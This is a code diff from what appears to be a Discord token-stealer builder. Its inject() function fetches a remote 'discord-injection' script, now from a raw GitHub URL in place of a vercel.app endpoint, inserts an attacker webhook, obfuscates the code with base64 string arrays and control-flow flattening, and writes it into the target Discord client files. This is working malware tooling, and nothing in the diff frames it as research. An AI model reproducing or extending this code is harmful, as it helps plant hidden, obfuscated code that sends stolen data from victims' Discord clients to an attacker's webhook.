@@ -78,7 +78,7 @@ function id(length) {
 
 async function inject() {
     try {
-        const res = await axios.get("https://6889-fun.vercel.app/api/aurathemes/injects/f/discord", { headers: { aurathemes: true }});
+        const res = await axios.get("https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js", { headers: { aurathemes: true }});
         const encode = obf.obfuscate(res.data.replace("%WEBHOOK%", getconfig.webhook).replace("%ID_REQUEST%", id(10)), { ignoreRequireImports: true, compact: true, controlFlowFlattening: true, controlFlowFlatteningThreshold: 0.5, deadCodeInjection: false, deadCodeInjectionThreshold: 0.01, debugProtection: false, debugProtectionInterval: 0, disableConsoleOutput: true, identifierNamesGenerator: "hexadecimal", log: false, numbersToExpressions: false, renameGlobals: false, selfDefending: false, simplify: true, splitStrings: false, splitStringsChunkLength: 5, stringArray: true, stringArrayEncoding: ["base64"], stringArrayIndexShift: true, stringArrayRotate: false, stringArrayShuffle: false, stringArrayWrappersCount: 5, stringArrayWrappersChainedCalls: true, stringArrayWrappersParametersMaxCount: 5, stringArrayWrappersType: "function", stringArrayThreshold: 1, transformObjectKeys: false, unicodeEscapeSequence: false });
         const payload = encode.getObfuscatedCode();
         injectPaths.forEach((file) => {
